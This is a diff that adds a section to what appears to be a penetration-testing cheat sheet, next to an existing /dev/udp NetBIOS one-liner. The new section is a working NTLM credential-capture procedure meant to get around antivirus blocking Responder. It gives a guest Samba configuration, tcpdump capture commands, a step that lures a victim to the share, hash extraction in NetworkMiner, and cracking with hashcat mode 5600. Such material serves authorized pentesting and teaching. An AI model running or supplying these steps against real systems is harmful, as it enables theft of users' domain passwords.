@@ -1445,3 +1445,52 @@ Same technique using a random transaction ID:
 
 `exec 5<>/dev/udp/192.168.1.166/137; (echo -n $(openssl rand -hex 2); echo -n 0000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001) | xxd -r -p >&5; timeout 1 strings <&5`
 
+## >> Capturing NTLM hashes with Samba and tcpdump
+
+If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with NTLM credential grabbing attacks using `Responder.py`, try this.  This assumes you are attacking a domain-joined computer in the my.lab domain and you are able to place a Samba server in the same namespace, e.g. smb.my.lab.
+
+**Setup a minimal Samba server**
+
+Edit `/etc/samba/smb.conf`<br />
+```
+[global]
+workgroup = WORKGROUP
+server role = standalone server
+map to guest = bad user
+security = user
+lanman auth = no
+ntlm auth = no
+ntlmv2 auth = yes
+[files]
+path = /samba
+browseable = yes
+read only = yes
+guest ok = yes
+force user = nobody
+```
+
+Create the folder and file that the victim will access.<br />
+```
+mkdir /samba
+chmod 777 /samba
+chown nobody /samba
+echo "this is a test" > /samba/test.txt
+```
+
+Start the Samba server and capture packets.<br />
+```
+service smbd start
+tcpdump -nn -vv -i eth0 -s 0 -w ntlm.cap port 445 or port 139
+```
+
+Lure the victim to access your file `\\smb.my.lab\files\test.txt`
+
+Type <ctrl>-c to stop tcpdump and stop the Samba service when you have collected enough packets.  Then open the ntlm.cap file in NetworkMiner.  Go to the "credentials" tab and right-click then copy password for the account whose NTLM hash you obtained.  Note the user name, e.g. user01, associated in the other packet.
+
+Convert the NTLM hash that looks like this:<br />
+`$NETNTLMv2$MYLAB$<hex>$<hex>$<hex>`
+
+To something like this:<br />
+`user01::MYLAB:<hex>:<hex>:<hex>`
+
+Crack the converted hash string using hashcat mode 5600 to attempt to recover the plaintext password.
